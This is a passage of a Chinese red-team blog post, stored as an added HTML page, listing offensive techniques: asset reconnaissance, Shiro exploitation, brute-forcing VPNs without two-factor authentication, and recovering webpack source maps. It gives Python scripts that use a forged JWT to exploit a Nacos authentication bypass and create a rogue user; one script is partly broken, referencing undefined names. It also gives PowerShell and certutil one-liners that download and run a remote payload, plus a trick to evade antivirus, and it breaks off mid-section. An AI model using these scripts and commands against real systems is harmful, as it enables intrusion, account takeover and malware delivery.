@@ -1,0 +1,525 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>红队技术-攻防实战小技巧 | Hyyrent blog</title><meta name="keywords" content="红队技术"><meta name="author" content="Hyyrent"><meta name="copyright" content="Hyyrent"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="外网打点资产测绘三剑客https:&#x2F;&#x2F;hunter.qianxin.com&#x2F;https:&#x2F;&#x2F;fofa.info&#x2F;https:&#x2F;&#x2F;quake.360.cn&#x2F; 挖掘高价值资产https:&#x2F;&#x2F;github.com&#x2F;EdgeSecurityTeam&#x2F;EHole ehole重构了一版，需要下载source code进行自编译，realease为旧版本  https:&#x2F;&#x2F;github.com&#x2F;lijiejie">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队技术-攻防实战小技巧">
+<meta property="og:url" content="https://pizz33.github.io/posts/5a4172515764/index.html">
+<meta property="og:site_name" content="Hyyrent blog">
+<meta property="og:description" content="外网打点资产测绘三剑客https:&#x2F;&#x2F;hunter.qianxin.com&#x2F;https:&#x2F;&#x2F;fofa.info&#x2F;https:&#x2F;&#x2F;quake.360.cn&#x2F; 挖掘高价值资产https:&#x2F;&#x2F;github.com&#x2F;EdgeSecurityTeam&#x2F;EHole ehole重构了一版，需要下载source code进行自编译，realease为旧版本  https:&#x2F;&#x2F;github.com&#x2F;lijiejie">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pizz33.github.io/img/13.png">
+<meta property="article:published_time" content="2023-05-05T07:40:07.000Z">
+<meta property="article:modified_time" content="2023-05-05T07:40:34.777Z">
+<meta property="article:author" content="Hyyrent">
+<meta property="article:tag" content="红队技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pizz33.github.io/img/13.png"><link rel="shortcut icon" href="/img/ico.jpg"><link rel="canonical" href="https://pizz33.github.io/posts/5a4172515764/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红队技术-攻防实战小技巧',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-05 15:40:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/13.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hyyrent blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红队技术-攻防实战小技巧</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-05T07:40:07.000Z" title="发表于 2023-05-05 15:40:07">2023-05-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-05T07:40:34.777Z" title="更新于 2023-05-05 15:40:34">2023-05-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红队技术-攻防实战小技巧"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="资产测绘三剑客"><a href="#资产测绘三剑客" class="headerlink" title="资产测绘三剑客"></a>资产测绘三剑客</h3><p><a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br><a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a><br><a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn/</a></p>
+<h3 id="挖掘高价值资产"><a href="#挖掘高价值资产" class="headerlink" title="挖掘高价值资产"></a>挖掘高价值资产</h3><p><a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p>
+<p>ehole重构了一版，需要下载source code进行自编译，realease为旧版本</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330125534443.png" alt="image-20230330125534443"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p>
+<p>挖掘敏感信息和后台地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Targets:</span><br><span class="line"></span><br><span class="line">  --host [HOST [HOST ...]]</span><br><span class="line">                        Scan several hosts from command line</span><br><span class="line">  -f TargetFile         Load new line delimited targets from TargetFile</span><br><span class="line">  -d TargetDirectory    Load all *.txt files from TargetDirectory</span><br><span class="line">  --crawler CrawlDirectory</span><br><span class="line">                        Load all *.log crawl files from CrawlDirectory</span><br><span class="line">  --network MASK        Scan all Target/MASK neighbour hosts,</span><br><span class="line">                        should be an integer between 8 and 31</span><br><span class="line"></span><br><span class="line">HTTP SCAN:</span><br><span class="line"></span><br><span class="line">  --rule [RuleFileName [RuleFileName ...]]</span><br><span class="line">                        Import specified rule files only.</span><br><span class="line">  -n, --no-crawl        No crawling, sub folders will not be processed</span><br><span class="line">  -nn, --no-check404    No HTTP 404 existence check</span><br><span class="line">  --full                Process all sub directories</span><br><span class="line"></span><br><span class="line">Scripts SCAN:</span><br><span class="line"></span><br><span class="line">  --scripts-only        Scan with user scripts only</span><br><span class="line">  --script [ScriptName [ScriptName ...]]</span><br><span class="line">                        Execute specified scripts only</span><br><span class="line">  --no-scripts          Disable all scripts</span><br><span class="line"></span><br><span class="line">CONCURRENT:</span><br><span class="line"></span><br><span class="line">  -p PROCESS            Num of processes running concurrently, 30 by default</span><br><span class="line">  -t THREADS            Num of scan threads for each scan process, 3 by default</span><br><span class="line"></span><br><span class="line">OTHER:</span><br><span class="line"></span><br><span class="line">  --proxy Proxy         Set HTTP proxy server</span><br><span class="line">  --timeout Timeout     Max scan minutes for each target, 10 by default</span><br><span class="line">  -md                   Save scan report as markdown format</span><br><span class="line">  --save-ports PortsDataFile</span><br><span class="line">                        Save open ports to PortsDataFile</span><br><span class="line">  --debug               Show verbose debug info</span><br><span class="line">  -nnn, --no-browser    Do not open web browser to view report</span><br><span class="line">  -v                    show program&#x27;s version number and exit</span><br></pre></td></tr></table></figure>
+
+<h3 id="shiro利用"><a href="#shiro利用" class="headerlink" title="shiro利用"></a>shiro利用</h3><p>找到key之后使用常规的漏洞工具无法正常利用，可能这时候很多人就放弃了，由于这两工具缺少部分利用链可能错过漏洞</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230329180743570.png" alt="image-20230329180743570"></p>
+<p>改用其他工具，优势在于key的数量多，利用链全</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330123327798.png" alt="image-20230330123327798"></p>
+<p>建议使用<code>feihong</code>大佬的工具，经典yyds</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
+<p>优先选用第四种方案，右键源代码添加可访问的静态资源</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330123949597.png" alt="image-20230330123949597"></p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330124143874.png" alt="image-20230330124143874"></p>
+<p>正常执行命令</p>
+<img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230329180758736.png" alt="image-20230329180758736" style="zoom:80%;" />
+
+<h3 id="缺少双因子爆破"><a href="#缺少双因子爆破" class="headerlink" title="缺少双因子爆破"></a>缺少双因子爆破</h3><p>许多vpn、邮箱系统没有进行验证限制，可进行暴力破解</p>
+<p>如 <code>Global-Protect</code> 谷歌了一波发现其用途是充当防火墙+VPN</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324150444125.png" alt="image-20230324150444125"></p>
+<p>由于系统缺少双因子认证，以工号信息为账号尝试爆破，成功获取到VPN的账号密码</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324150501755.png" alt="image-20230324150501755"></p>
+<p>连接VPN，进入内网</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324150533884.png" alt="image-20230324150533884"></p>
+<h3 id="源代码泄露"><a href="#源代码泄露" class="headerlink" title="源代码泄露"></a>源代码泄露</h3><p>通过github筛选目标相关关键字 <code>password</code> <code>xx.com</code></p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220928153240493.png" alt="image-20220928153240493"></p>
+<p>源代码项目里面可能包含了各种密码，或者是提取指纹寻找源码进行审计</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324142817659.png" alt="image-20230324142817659"></p>
+<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>在攻防演练过程中，数据泄露分数占比也是较高的，我们可以多去寻找一些查询系统看看是否存在敏感信息泄露</p>
+<p>信息搜集过程中通过360quake的图像预览发现了一个信息查询系统，猜测可能存在信息泄露问题</p>
+<p>在前端位置，数据都是加密的</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324142216065.png" alt="image-20230324142216065"></p>
+<p>抓取查询数据，查看返回数据包发现是明文显示</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324142234159.png" alt="image-20230324142234159"></p>
+<h3 id="webpack接口"><a href="#webpack接口" class="headerlink" title="webpack接口"></a>webpack接口</h3><p>在我们渗透过程中，越来越多的系统会采用webpack进行打包，如下图的指纹所示</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324151314103.png" alt="image-20230324151314103"></p>
+<p>工具自动化寻找未授权</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230208155631862.png" alt="image-20230208155631862"></p>
+<p>或查看js还原接口</p>
+<p>右键源代码——查看检索js——在后面添加.map</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://xx.xx.xx.xx/*.js.map</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230208155102503.png" alt="image-20230208155102503"></p>
+<p>之后会下载一个js.map，使用<code>reverse-sourcemap</code>进行还原</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --global reverse-sourcemap</span><br><span class="line">reverse-sourcemap --output-dir 生成的目录 app.6804b239.js.map</span><br></pre></td></tr></table></figure>
+
+<p>可寻找各种未授权的接口进行进一步的利用，可检索<code>upload、add</code>等关键字</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230208155348698.png" alt="image-20230208155348698"></p>
+<h3 id="弱口令＋后台上传"><a href="#弱口令＋后台上传" class="headerlink" title="弱口令＋后台上传"></a>弱口令＋后台上传</h3><p>碰到没有验证码的站，可以尝试进行爆破</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330124342812.png" alt="image-20230330124342812"></p>
+<img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330123418728.png" alt="image-20230330123418728" style="zoom: 80%;" />
+
+<p>成功爆破到账密后，可寻找后台上传接口进行上传</p>
+<img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330124520039.png" alt="image-20230330124520039" style="zoom:80%;" />
+
+<img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330124558474.png" alt="image-20230330124558474" style="zoom:80%;" />
+
+<h3 id="nacos开放公网"><a href="#nacos开放公网" class="headerlink" title="nacos开放公网"></a>nacos开放公网</h3><p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330125920125.png" alt="image-20230330125920125"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Pizz33/nacos_vul">https://github.com/Pizz33/nacos_vul</a></p>
+<p>批量验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"># 定义自定义路径和Header</span><br><span class="line">custom_path = &#x27;/nacos/v1/auth/users?pageNo=1&amp;pageSize=2&#x27;</span><br><span class="line">proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Nacos-Server&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Authorization&quot;: &quot;Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Dest&quot;: &quot;document&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Mode&quot;: &quot;navigate&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;,</span><br><span class="line">    &quot;Pragma&quot;: &quot;no-cache&quot;,</span><br><span class="line">    &quot;Te&quot;: &quot;trailers&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">&#125;</span><br><span class="line"># 从url.txt文件中读取URL列表</span><br><span class="line">with open(&#x27;url.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    urls = f.read().splitlines()</span><br><span class="line"></span><br><span class="line"># 循环发送GET请求并判断回显结果</span><br><span class="line">for url in urls:</span><br><span class="line">    full_url = url + custom_path  # 拼接完整URL</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(full_url,proxies=proxies, headers=header,verify=False,timeout=2)</span><br><span class="line">        if response.status_code == 200 and response.content.find(b&quot;pageNumber&quot;) != -1:</span><br><span class="line">            print(f&#x27;&#123;url&#125; 存在nacos身份验证绕过漏洞&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&#x27;&#123;url&#125; 不存在nacos身份验证绕过漏洞&#x27;)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(f&#x27;&#123;url&#125; 访问失败 &#123;e&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230316151435950.png" alt="image-20230316151435950"></p>
+<p>脚本化添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">from termcolor import colored</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span><br><span class="line"># 获取命令行参数中的 URL</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(&quot;Usage: python test.py &lt;url&gt;&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line">url = sys.argv[1]</span><br><span class="line"></span><br><span class="line">post_url = &quot;/nacos/v1/auth/users&quot;</span><br><span class="line">request_url = url + post_url</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Nacos-Server&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Authorization&quot;: &quot;Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Dest&quot;: &quot;document&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Mode&quot;: &quot;navigate&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;,</span><br><span class="line">    &quot;Pragma&quot;: &quot;no-cache&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;username&quot;: &quot;test123&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;test123&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(request_url, headers=headers, data=data, proxies=proxies,verify=False)</span><br><span class="line"></span><br><span class="line">if response.status_code == 200 and response.content.find(b&quot;ok&quot;) != -1:</span><br><span class="line">    print(colored(&#x27;[*] &#x27; + url + &#x27; 存在nacos身份认证绕过漏洞！ &#x27;, &#x27;green&#x27;))</span><br><span class="line">    print(colored(&#x27;已创建用户test123/test123&#x27;, &#x27;green&#x27;))</span><br><span class="line">else:</span><br><span class="line">    print(colored(&#x27;[-] &#x27; + url + &#x27; 不存在nacos身份认证绕过漏洞！ \n&#x27;, &#x27;red&#x27;))</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">for url in urls:</span><br><span class="line">    t = threading.Thread(target=send_request, args=(url,))</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"># 等待所有线程完成</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230316092515338.png" alt="image-20230316092515338"></p>
+<p>任意用户添加登录，配置文件里详情可能含有账户密码等敏感信息</p>
+<img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230330123352081.png" alt="image-20230330123352081" style="zoom:80%;" />
+
+
+
+<h2 id="横向利用"><a href="#横向利用" class="headerlink" title="横向利用"></a>横向利用</h2><h3 id="cobaltstrike上线"><a href="#cobaltstrike上线" class="headerlink" title="cobaltstrike上线"></a>cobaltstrike上线</h3><h3 id="隐藏C2地址"><a href="#隐藏C2地址" class="headerlink" title="隐藏C2地址"></a>隐藏C2地址</h3><p>云函数 or cdn </p>
+<h4 id="常规上线"><a href="#常规上线" class="headerlink" title="常规上线"></a>常规上线</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))&quot;</span><br><span class="line">2、certutil -urlcache -split -f http://x.x.x.x/a C:\Users\Public\1.exe &amp;&amp; C:\Users\Public\1.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕杀软上线"><a href="#绕杀软上线" class="headerlink" title="绕杀软上线"></a>绕杀软上线</h4><h5 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h5><p>复制certutil文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\certutil.exe c:\programdata\a.exe &amp;&amp; c:\programdata\a.exe -urlcache -split -f http://x.x.x.x/a C:\Users\Public\1.exe &amp;&amp; C:\Users\Public\1.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="360"><a href="#360" class="headerlink" title="360"></a>360</h5><p>缓存文件还原</p>
